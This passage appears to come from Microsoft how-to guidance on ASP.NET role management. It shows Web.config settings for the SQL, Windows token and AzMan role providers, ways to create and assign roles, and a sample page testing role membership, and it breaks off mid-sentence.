&lt;h1&gt;Step 2. Configure Your Role Provider in Web.config&lt;/h1&gt;
&lt;p&gt;In this step, you configure the appropriate role provider in your application's Web.config file.&lt;/p&gt;
&lt;h2&gt;Using SqlRoleProvider&lt;/h2&gt;
&lt;p&gt;To use the role store in the default SQL Express instance in a database in your Web site's \app_dir folder, add the following configuration to your application's Web.config file.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;roleManager enabled=&amp;quot;true&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;/system.web&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This configuration enables role management and causes your application to use the default provider named
&lt;strong&gt;AspNetSqlRoleProvider&lt;/strong&gt; defined in the Machine.config file. This uses the local SQL Express instance.&lt;/p&gt;
&lt;p&gt;To use a role store in SQL Server, add a connection string to point to your role database and add a role provider definition in the Web.config file, as shown here.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;connectionStrings&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add name=&amp;quot;SqlRoleManagerConnection&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString=&amp;quot;Data Source=sqlinstance;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Initial Catalog=aspnetdb;Integrated Security=SSPI;&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/add&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt;&lt;br&gt;&amp;lt;/configuration&amp;gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;pre&gt;&amp;lt;roleManager enabled=&amp;quot;true&amp;quot; defaultProvider=&amp;quot;SqlRoleManager&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;providers&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add name=&amp;quot;SqlRoleManager&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; type=&amp;quot;System.Web.Security.SqlRoleProvider&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionStringName=&amp;quot;SqlRoleManagerConnection&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; applicationName=&amp;quot;MyApplication&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/providers&amp;gt;&lt;br&gt;&amp;lt;/roleManager&amp;gt;&lt;/pre&gt;
&lt;h2&gt;Using WindowsTokenRoleProvider&lt;/h2&gt;
&lt;p&gt;The Windows security system acts as role store for this provider, and Windows groups represent roles. You can use this provider when you use Windows authentication. To do this, add the following configuration to your application's Web.config file.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;authentication mode=&amp;quot;Windows&amp;quot; /&amp;gt;&lt;br&gt;&amp;lt;roleManager enabled=&amp;quot;true&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; defaultProvider=&amp;quot;AspNetWindowsTokenRoleProvider&amp;quot; /&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This configuration enables role management and uses the role provider named &lt;strong&gt;
AspNetWindowsTokenRoleProvider&lt;/strong&gt;, which is defined in the Machine.config file.&lt;/p&gt;
&lt;h2&gt;Using AuthorizationStoreRoleProvider&lt;/h2&gt;
&lt;p&gt;The &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt; is used to store roles data in an AzMan policy store in an XML file, in Active Directory, or in ADAM. To configure this provider, add a connection string to point to the relevant policy store and then add
 a role provider definition in the Web.config file.&lt;/p&gt;
&lt;p&gt;The following connection string refers to an XML-based policy store contained in a file named Azmanstore.xml.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt; &lt;br&gt;&amp;nbsp; &amp;lt;connectionStrings&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add name=&amp;quot;AzManPolicyStoreConnectionString&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString=&amp;quot;msxml://c:/RolesData/azmanstore.xml&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt; &lt;br&gt;&amp;lt;/configuration&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following connection string refers to an ADAM-based policy store.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt; &lt;br&gt;&amp;nbsp; &amp;lt;connectionStrings&amp;gt; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add name=&amp;quot;AzManPolicyStoreConnectionString&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionString= &amp;quot;msldap://servername:port/CN=AzManADAMStore,&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OU=SecNetPartition,O=SecNet,C=US&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;/connectionStrings&amp;gt; &lt;br&gt;&amp;lt;/configuration&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following configuration shows how to enable role management and use the provider named
&lt;strong&gt;RoleManagerAzManADAMProvider&lt;/strong&gt;. This uses the connection string shown earlier to connect to an ADAM policy store.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;&amp;lt;roleManager &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; enabled=&amp;quot;true&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cacheRolesInCookie=&amp;quot;true&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; defaultProvider=&amp;quot;RoleManagerAzManADAMProvider&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieName=&amp;quot;.ASPXROLES&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookiePath=&amp;quot;/&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieTimeout=&amp;quot;30&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieRequireSSL=&amp;quot;false&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieSlidingExpiration=&amp;quot;true&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; createPersistentCookie=&amp;quot;false&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; cookieProtection=&amp;quot;All&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;providers&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add name=&amp;quot;RoleManagerAzManADAMProvider&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; type=&amp;quot;System.Web.Security.AuthorizationStoreRoleProvider, System.Web,&lt;br&gt;     Version=3.5.0.0, Culture=neutral, publicKeyToken=b03f5f7f11d50a3a&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionStringName=&amp;quot;AzManPolicyStoreConnectionString&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; applicationName=&amp;quot;AzManDemo&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/providers&amp;gt;&lt;br&gt;&amp;lt;/roleManager&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;h1&gt;Step 3. Create and Assign Roles&lt;/h1&gt;
&lt;p&gt;In this step, you create roles for your application and assign users to those roles. There are several methods you can use to create and assign roles. Using them depends on how your application authenticates its users and which role provider it uses. The
 various methods for creating and assigning users to roles include: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;At development time, you can use the ASP.NET configuration tool. &lt;/li&gt;&lt;li&gt;If you are using the &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;, you can use the AzMan administrator Microsoft Management Console (MMC) snap-in.
&lt;/li&gt;&lt;li&gt;You can create roles programmatically by using either the role management APIs or, if you are using the
&lt;strong&gt;SqlRoleProvider&lt;/strong&gt;, by executing SQL scripts to add them to the database directly.
&lt;/li&gt;&lt;li&gt;If you are using the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;, you use the Windows Computer Management tool or Active Directory Users and Computers to create Windows groups which are used as roles.
&lt;/li&gt;&lt;/ul&gt;
&lt;h2&gt;Using the ASP.NET Web Site Configuration Tool&lt;/h2&gt;
&lt;p&gt;You can use the ASP.NET Web Site Configuration tool from Visual Studio .NET at development time if your application uses Forms authentication and you have configured your application to use the ASP.NET membership feature. If your application uses Windows
 authentication, you cannot use this tool and you must use either the Roles API or the AzMan administrator MMC snap-in as described in the next section.
&lt;/p&gt;
&lt;h3&gt;To assign users to roles by using the ASP.NET Web Site Configuration tool &lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Create roles by using the ASP.NET configuration tool by performing the following steps:
&lt;ol&gt;
&lt;li&gt;Start Visual Studio. &lt;/li&gt;&lt;li&gt;On the &lt;strong&gt;Website&lt;/strong&gt; menu, click &lt;strong&gt;ASP.NET Configuration&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;On the &lt;strong&gt;Home&lt;/strong&gt; tab, click &lt;strong&gt;Security&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Create or&lt;/strong&gt; &lt;strong&gt;Manage Roles&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Use the form to add your application roles. &lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;li&gt;Assign users to roles as follows:
&lt;ol&gt;
&lt;li&gt;In Visual Studio .NET, click &lt;strong&gt;ASP.NET Configuration &lt;/strong&gt;on the &lt;strong&gt;
Website&lt;/strong&gt; menu. &lt;/li&gt;&lt;li&gt;On the &lt;strong&gt;Home&lt;/strong&gt; tab, click &lt;strong&gt;Security&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Create or&lt;/strong&gt; &lt;strong&gt;Manage Roles&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;In the &lt;strong&gt;Add/Remove Users&lt;/strong&gt; column, click &lt;strong&gt;Manage&lt;/strong&gt; for a role you have created. This opens a form where you can add or remove users from the role.
&lt;/li&gt;&lt;/ol&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h2&gt;Using the AzMan Administrator MMC Snap-In&lt;/h2&gt;
&lt;p&gt;This tool is provided for applications that use an AzMan store to manage its users and roles. It is particularly convenient for applications using Windows authentication that cannot use the ASP.NET configuration tool to assign users to roles.
&lt;/p&gt;
&lt;h2&gt;Using SQL Scripts&lt;/h2&gt;
&lt;p&gt;If you have suitable permissions on the role management database, you can run a SQL script to call the various stored procedures provided with the Aspnetdb database. For example, the following script creates a new role in an application and adds a user to
 it.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;EXEC aspnet_Roles_CreateRole 'ThisApplication', 'NewRole'&lt;br&gt;EXEC aspnet_UsersInRoles_AddUsersToRoles 'ThisApplication', 'ThisUser', 'NewRole', 8  &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;There are 19 role-managing stored procedures created inside the role management database. Most of these stored procedures have purposes analogous to calls in the role management API.
&lt;/p&gt;
&lt;h2&gt;Using the Role Management APIs&lt;/h2&gt;
&lt;p&gt;You can assign users to roles or remove users from roles by using methods of the
&lt;strong&gt;System.Web.Security.Roles&lt;/strong&gt; class. You can also check for the user's role membership and authorize as appropriate.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Because the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; is read-only, it supports only the
&lt;strong&gt;IsUserInRole&lt;/strong&gt; and &lt;strong&gt;GetRolesForUser &lt;/strong&gt;methods.&lt;strong&gt;
&lt;/strong&gt;&lt;/blockquote&gt;
&lt;p&gt;The following code shows how to create new roles.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;using System.Web.Security;&lt;/pre&gt;
&lt;pre&gt;if (!Roles.RoleExists(&amp;quot;TestRole&amp;quot;))&lt;br&gt;{&lt;br&gt;&amp;nbsp; Roles.CreateRole(&amp;quot;TestRole&amp;quot;);&lt;br&gt;}  &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Role names are not case sensitive. If you attempt to create the same role twice, an exception is thrown.&lt;/blockquote&gt;
&lt;p&gt;The following code shows how to add uses to roles.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;// Example 1 - Add one user to one role&lt;br&gt;Roles.AddUserToRole(&amp;quot;TestOne&amp;quot;, &amp;quot;ExampleRole1&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;// Example 2 - Add one user to several roles&lt;br&gt;Roles.AddUserToRoles(&amp;quot;TestTwo&amp;quot;, &lt;br&gt;&amp;nbsp; new string[] { &amp;quot;ExampleRole1&amp;quot;, &amp;quot;ExampleRole2&amp;quot; });&lt;/pre&gt;
&lt;pre&gt;// Example 3 - Add several users to one roles&lt;br&gt;Roles.AddUsersToRole(&lt;br&gt;&amp;nbsp; new string[] { &amp;quot;TestTwo&amp;quot;, &amp;quot;TestThree&amp;quot; }, &amp;quot;ExampleRole3&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;// Example 4 - Add several users to several roles&lt;br&gt;Roles.AddUsersToRoles(&lt;br&gt;&amp;nbsp; new string[] { &amp;quot;TestThree&amp;quot;, &amp;quot;TestFour&amp;quot; }, &lt;br&gt;&amp;nbsp; new string[] { &amp;quot;ExampleRole4&amp;quot; }); &lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;The following code shows how to remove users from roles.&lt;/p&gt;
&lt;div&gt;
&lt;pre&gt;// Example 1 - Add one user to one role&lt;br&gt;Roles.RemoveUserFromRole(&amp;quot;TestOne&amp;quot;, &amp;quot;ExampleRole1&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;// Example 2 - Add one user to several roles&lt;br&gt;Roles.RemoveUserFromRoles(&amp;quot;TestTwo&amp;quot;, &lt;br&gt;&amp;nbsp; new string[] { &amp;quot;ExampleRole1&amp;quot;, &amp;quot;ExampleRole2&amp;quot; });&lt;/pre&gt;
&lt;pre&gt;// Example 3 - Add several users to one roles&lt;br&gt;Roles.RemoveUsersFromRole(&lt;br&gt;&amp;nbsp; new string[] { &amp;quot;TestTwo&amp;quot;, &amp;quot;TestThree&amp;quot; }, &amp;quot;ExampleRole3&amp;quot;);&lt;/pre&gt;
&lt;pre&gt;// Example 4 - Add several users to several roles&lt;br&gt;Roles.RemoveUsersFromRoles(&lt;br&gt;&amp;nbsp; new string[] { &amp;quot;TestThree&amp;quot;, &amp;quot;TestFour&amp;quot; }, &lt;br&gt;&amp;nbsp; new string[] { &amp;quot;ExampleRole4&amp;quot; }); &lt;/pre&gt;
&lt;/div&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Both the &lt;strong&gt;AddUser&lt;/strong&gt; and &lt;strong&gt;
RemoveUser&lt;/strong&gt; methods throw a &lt;strong&gt;TargetInvocationException&lt;/strong&gt; if you specify a role that does not exist or if you specify an invalid Windows user account name. The inner exception gives the reason for the failure. None of the methods mentioned
 earlier can be used against a &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;.&lt;/blockquote&gt;
&lt;h1&gt;Step 4. Perform Role-Based Authorization &lt;/h1&gt;
&lt;p&gt;In this step, you create test applications that use role management. This step provides two samples:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The first sample uses the &lt;strong&gt;SqlRoleProvider&lt;/strong&gt; or &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;, in which the application assigns a role to a user, removes a role from a user, and tests for role membership.
&lt;/li&gt;&lt;li&gt;The second sample uses the &lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; to check which Windows groups (roles) the current user is a member of. The
&lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt; supports only the&lt;strong&gt; IsUserInRole &lt;/strong&gt;
and &lt;strong&gt;GetRolesForUser &lt;/strong&gt;methods of the role management API, and it does not allow you to create, assign to, or remove users from Windows groups.
&lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Both of these sample applications use Integrated Windows authentication in Microsoft Internet Information Services (IIS) to authenticate callers. This is a requirement when using the
&lt;strong&gt;WindowsTokenRoleProvider&lt;/strong&gt;, but if you are using the &lt;strong&gt;SqlRoleProvider&lt;/strong&gt; or
&lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;, you could use alternative authentication such as forms authentication.&lt;/p&gt;
&lt;h2&gt;Sample: Using SqlRoleProvider or AuthorizationStoreRoleProvider&lt;/h2&gt;
&lt;p&gt;This sample uses the &lt;strong&gt;SqlRoleProvider&lt;/strong&gt; or &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;To test role management with SqlRoleProvider or AuthorizationStoreRoleProvider
&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;Use Visual Studio to create a Web site, add a Web.config file, and configure the role store and
&lt;strong&gt;SqlRoleProvider&lt;/strong&gt; or &lt;strong&gt;AuthorizationStoreRoleProvider&lt;/strong&gt; as described in steps 1 and 2 of this How to.
&lt;/li&gt;&lt;li&gt;Using the Internet Information Services MMC snap-in, edit the properties of the Web site. Edit the
&lt;strong&gt;Anonymous access and authentication control&lt;/strong&gt; on the &lt;strong&gt;Directory&lt;/strong&gt;
&lt;strong&gt;security&lt;/strong&gt; tab. Clear the &lt;strong&gt;Anonymous access&lt;/strong&gt; check box and select the
&lt;strong&gt;Integrated Windows authentication&lt;/strong&gt; check box. &lt;/li&gt;&lt;li&gt;In the Web.config file, enable Windows authentication.
&lt;div&gt;
&lt;pre&gt;&amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ...&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authentication mode=&amp;quot;Windows&amp;quot;/&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; ...&lt;br&gt;&amp;lt;/system.web&amp;gt;  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Add the following code to the Default.aspx file.
&lt;div&gt;
&lt;pre&gt;&amp;lt;%@ Page Language=&amp;quot;C#&amp;quot; %&amp;gt;&lt;br&gt;&amp;lt;!DOCTYPE html PUBLIC &amp;quot;-//W3C//DTD XHTML 1.1//EN&amp;quot; &amp;quot;&lt;a href="http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd"&gt;http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd&lt;/a&gt;&amp;quot;&amp;gt;&lt;br&gt;&amp;lt;script runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Page_Load(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (!Roles.RoleExists(&amp;quot;TestRole&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Roles.CreateRole(&amp;quot;TestRole&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ShowRoleMembership();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; private void ShowRoleMembership()&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (Roles.IsUserInRole(&amp;quot;TestRole&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Label1.Text = User.Identity.Name &amp;#43; &amp;quot; is in role TestRole&amp;quot;;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; else&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Label1.Text = User.Identity.Name &amp;#43; &amp;quot; is NOT in role TestRole&amp;quot;;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Button1_Click(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Roles.AddUserToRole(User.Identity.Name, &amp;quot;TestRole&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ShowRoleMembership();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; protected void Button2_Click(object sender, EventArgs e)&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Roles.RemoveUserFromRole(User.Identity.Name, &amp;quot;TestRole&amp;quot;);&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; ShowRoleMembership();&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;&amp;lt;/script&amp;gt;&lt;br&gt;&amp;lt;html&amp;nbsp; &amp;gt;&lt;br&gt;&amp;lt;head runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;title&amp;gt;Untitled Page&amp;lt;/title&amp;gt;&lt;br&gt;&amp;lt;/head&amp;gt;&lt;br&gt;&amp;lt;body&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;form id=&amp;quot;form1&amp;quot; runat=&amp;quot;server&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;Button1&amp;quot; runat=&amp;quot;server&amp;quot; Text=&amp;quot;Add to role&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnClick=&amp;quot;Button1_Click&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Button ID=&amp;quot;Button2&amp;quot; runat=&amp;quot;server&amp;quot; Text=&amp;quot;Remove from role&amp;quot; &lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; OnClick=&amp;quot;Button2_Click&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;br /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;asp:Label ID=&amp;quot;Label1&amp;quot; runat=&amp;quot;server&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/div&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;/form&amp;gt;&lt;br&gt;&amp;lt;/body&amp;gt;&lt;br&gt;&amp;lt;/html  &lt;/pre&gt;
&lt;/div&gt;
&lt;/li&gt;&lt;li&gt;Run the application. Note the following features about this application:
&lt;ol&gt;
&lt;li&gt;When you browse to the application, the code in the &lt;strong&gt;Page_Load&lt;/strong&gt; event handler creates the role
&lt;strong&gt;TestRole&lt;/strong&gt; if it does not already exist.
&lt;ul&gt;
&lt;li&gt;The text of &lt;strong&gt;Label1&lt;/strong&gt; shows whether the current authenticated user is a member of the
&lt;strong&gt;TestRole&lt;/strong&gt; role. &lt;/li&gt;&lt;li&gt;When you click the &lt;strong&gt;Add to role&lt;/strong&gt; button, the code in the &lt;strong&gt;
Button1_Click&lt;/strong&gt; event handler uses the role management API to add the current authenticated user to the
&lt;strong&gt;TestRole&lt;/strong&gt; role. &lt;/li&gt;&lt;li&gt;If you click the &lt;strong&gt;Add to role&lt;/strong&gt; button again before clicking the
&lt;strong&gt;Remove from role&lt;/strong&gt; button, the call to &lt;strong&gt;Roles.AddUserToRole&lt;/strong&gt; throws an exception because the user is already in the role
&lt;strong&gt;TestUser&lt;/strong&gt;. You must code for this condition in your applications.
&lt;/li&gt;&lt;li&gt;When you click the &lt;strong&gt;Remove from role&lt;/strong&gt; button, the current authenticated user is removed from the role
